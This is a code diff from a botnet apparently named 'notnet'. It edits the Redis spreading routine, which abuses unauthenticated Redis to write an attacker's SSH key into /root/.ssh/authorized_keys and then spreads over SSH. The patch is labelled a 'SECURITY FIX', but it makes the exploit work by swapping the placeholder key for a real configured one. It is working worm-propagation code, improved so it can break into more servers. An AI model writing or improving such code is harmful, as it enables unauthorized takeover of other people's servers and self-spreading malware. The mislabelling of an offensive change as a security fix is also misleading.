@@ -1020,23 +1020,59 @@ int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
 }
 
 /* ── Redis Spreading ───────────────────────────────────────── */
-int exploit_redis_unauth(const char *ip, uint16_t port) {
+/* SECURITY FIX (#72): The SSH public key injected into Redis
+ * authorized_keys must be provisioned per-deployment via the
+ * redis_ssh_key config key or NOTNET_REDIS_SSH_KEY env var.
+ * The old code injected a literal "ssh-rsa AAAAB3NzaC1...notnet-key..."
+ * placeholder which is not a valid base64 RSA key — OpenSSH/Dropbear
+ * reject it, so the Redis -> SSH-22 pivot could never authenticate.
+ * A build/config that still contains the placeholder is refused. */
+
+static const char *get_redis_ssh_key(notnet_bot_t *bot) {
+    if (!bot) return NULL;
+    if (bot->redis_ssh_key[0] != '\0') return bot->redis_ssh_key;
+    const char *env = getenv("NOTNET_REDIS_SSH_KEY");
+    if (env && env[0] != '\0') {
+        strncpy(bot->redis_ssh_key, env, sizeof(bot->redis_ssh_key) - 1);
+        bot->redis_ssh_key[sizeof(bot->redis_ssh_key) - 1] = '\0';
+        return bot->redis_ssh_key;
+    }
+    return NULL;
+}
+
+int exploit_redis_unauth(notnet_bot_t *bot, const char *ip, uint16_t port) {
     int sock = create_connection(ip, port, SCAN_TIMEOUT_MS);
     if (sock < 0) return -1;
-    
+
+    /* SECURITY FIX (#72): Require a real key. Refuse to run the Redis
+     * vector with the old placeholder or no key at all. */
+    const char *ssh_key = get_redis_ssh_key(bot);
+    if (!ssh_key || strstr(ssh_key, "notnet-key") || strstr(ssh_key, "...")) {
+        log_error("Redis: no valid redis_ssh_key configured (set redis_ssh_key= "
+                  "or NOTNET_REDIS_SSH_KEY) — refusing to inject placeholder");
+        close(sock);
+        return -1;
+    }
+
     /* Send Redis commands */
-    char cmd[512];
-    
+    char cmd[2048];
+
     /* Set SSH key */
     snprintf(cmd, sizeof(cmd),
         "CONFIG SET dir /root/.ssh\r\n"
         "CONFIG SET dbfilename authorized_keys\r\n"
-        "SET key1 \"ssh-rsa AAAAB3NzaC1...notnet-key...\"\r\n"
+        "SET key1 \"%.1000s\"\r\n"
         "SAVE\r\n"
-        "PING\r\n");
-    
-    send(sock, cmd, strlen(cmd), 0);
-    
+        "PING\r\n",
+        ssh_key);
+
+    int sent = send(sock, cmd, strlen(cmd), 0);
+    if (sent != (int)strlen(cmd)) {
+        log_warn("Redis: send failed: %s", strerror(errno));
+        close(sock);
+        return -1;
+    }
+
     /* Read response */
     char resp[256];
     fd_set fds;
@@ -1045,7 +1081,7 @@ int exploit_redis_unauth(const char *ip, uint16_t port) {
     FD_SET(sock, &fds);
     tv.tv_sec = 2;
     tv.tv_usec = 0;
-    
+
     int success = 0;
     if (select(sock + 1, &fds, NULL, NULL, &tv) > 0) {
         recv(sock, resp, sizeof(resp) - 1, 0);
@@ -1055,7 +1091,7 @@ int exploit_redis_unauth(const char *ip, uint16_t port) {
             success = 1;
         }
     }
-    
+
     close(sock);
     return success;
 }
@@ -1066,7 +1102,7 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
     log_info("Redis: unauthenticated access %s:%d", ip, port);
     
     /* Try unauthenticated first */
-    if (exploit_redis_unauth(ip, port)) {
+    if (exploit_redis_unauth(bot, ip, port)) {
         log_info("Redis: exploited unauth on %s:%d", ip, port);
         /* Wait for SSH key to take effect */
         usleep(5000000); /* 5 seconds */
@@ -1123,7 +1159,7 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
                     if (strstr(ping_resp, "+PONG")) {
                         close(sock);
                         /* Exploit */
-                        exploit_redis_unauth(ip, port);
+                        exploit_redis_unauth(bot, ip, port);
                         usleep(5000000);
                         spread_ssh(bot, ip, 22);
                         return 0;
